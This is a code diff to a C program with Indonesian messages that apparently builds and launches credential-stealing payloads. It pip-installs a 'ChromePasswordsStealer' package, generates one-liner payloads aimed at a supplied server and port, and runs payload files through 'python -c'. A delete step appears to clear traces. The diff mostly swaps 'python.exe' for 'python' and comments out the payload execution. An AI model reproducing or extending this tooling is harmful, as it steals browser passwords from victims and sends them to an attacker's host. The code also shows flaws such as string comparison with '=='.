@@ -6,6 +6,8 @@
 #include <stdbool.h>
 
 #define BUFLEN 1024
+#define CLEN 150
+#define CLEN2 500
 
 typedef struct {
     char *mode;
@@ -17,7 +19,7 @@ int check() {
     char command[50];
     char result[10];
 
-    snprintf(command, sizeof(command), "python.exe --version");
+    snprintf(command, sizeof(command), "python --version");
     fp = popen(command, "r");
 
     if (fp == NULL) {
@@ -187,7 +189,7 @@ void generator(const char *f1, const char *f2, const char *f3) {
     if (fp1 == NULL) {
         perror("Gagal membuka file");
     }
-    fprintf(fp1, "%s", notif);
+    fprintf(fp1, "%s", bahan);
     fclose(fp1);
     
     fp2 = fopen(f2, "w");
@@ -201,11 +203,11 @@ void generator(const char *f1, const char *f2, const char *f3) {
     if (fp3 == NULL) {
         perror("Gagal membuka file");
     }
-    fprintf(fp3, "%s", bahan);
+    fprintf(fp3, "%s", notif);
     fclose(fp3);
     
-    char status[150];
-    snprintf(status, sizeof(status), "File %s, %s, %s berhasil dibuat.\n", f1, f2, f3);
+    char status[CLEN];
+    snprintf(status, sizeof(status), "\nFile %s, %s, %s berhasil dibuat.\n", f1, f2, f3);
     printf("%s\n", status);
 }
 
@@ -258,15 +260,15 @@ bool ping(const char *ip_addr) {
 }
 
 void notif(const char *sv, const int pr, const char *msg) {
-    char command[500];
-    snprintf(command, sizeof(command), "python.exe notif.py %s %d %s", sv, pr, msg);
+    char command[CLEN2];
+    snprintf(command, sizeof(command), "python notif.py %s %d %s", sv, pr, msg);
     system(command);
     sleep(1);
 }
 
 void delete() {
-    char command[150];
-    snprintf(command, sizeof(command), "python.exe oliner.py -d");
+    char command[CLEN];
+    snprintf(command, sizeof(command), "python oliner.py -d");
     system(command);
     sleep(1);
 }
@@ -275,6 +277,8 @@ void run(const char *s, const int p, const char *pload) {
     printf("\nMenjalankan payload\n");
 
     char *text = readFile(pload);
+    // printf(text);
+    // printf("\n");
     if (!text) {
         fprintf(stderr, "Gagal membaca file %s\n", pload);
     }
@@ -288,7 +292,7 @@ void run(const char *s, const int p, const char *pload) {
     }
 
     const int length = 10000000;
-    size_t commandLength = strlen("python.exe -c \"\" ") + strlen(content) + strlen(s) + 20;
+    size_t commandLength = strlen("python -c \"\" ") + strlen(content) + strlen(s) + 20;
     if (commandLength < length) {
         commandLength = length;
     }
@@ -300,17 +304,17 @@ void run(const char *s, const int p, const char *pload) {
         exit(EXIT_FAILURE);
     }
 
-    snprintf(command, commandLength, "python.exe -c \"%s\" %s %d", text, s, p);
-    
-    system(command);
-    int ret = system(command);
-    if (ret == -1) {
-        perror("\nGagal menjalankan perintah");
-        free(text);
-        free(content);
-        free(command);
-        exit(EXIT_FAILURE);
-    }
+    snprintf(command, commandLength, "python -c \"%s\" %s %d", text, s, p);
+    printf("\n%s\n", command);
+    // system(command);
+    // int ret = system(command);
+    // if (ret == -1) {
+    //     perror("\nGagal menjalankan perintah");
+    //     free(text);
+    //     free(content);
+    //     free(command);
+    //     exit(EXIT_FAILURE);
+    // }
 
     free(text);
     free(content);
@@ -325,8 +329,8 @@ void generate(Payload *payloads, int numModes, int numPayloads, const char *s, c
         if (payloads[i].mode == "done") {
             break;
         }
-        char command[150];
-        snprintf(command, sizeof(command), "python.exe oliner.py %s %d %s %s %s", s, p, payloads[i].mode, payloads[i].payload, payloads[i + 1].payload);
+        char command[CLEN];
+        snprintf(command, sizeof(command), "python oliner.py %s %d %s %s %s", s, p, payloads[i].mode, payloads[i].payload, payloads[i + 1].payload);
         system(command);
         sleep(1);
     }
@@ -335,8 +339,8 @@ void generate(Payload *payloads, int numModes, int numPayloads, const char *s, c
 
 void install(const char *s, const int p) {
     printf("Install modul\n");
-    char command[150];
-    snprintf(command, sizeof(command), "python.exe -m pip install PyOneLiner ChromePasswordsStealer");
+    char command[CLEN];
+    snprintf(command, sizeof(command), "python -m pip install PyOneLiner ChromePasswordsStealer");
     system(command);
     sleep(1);
 }
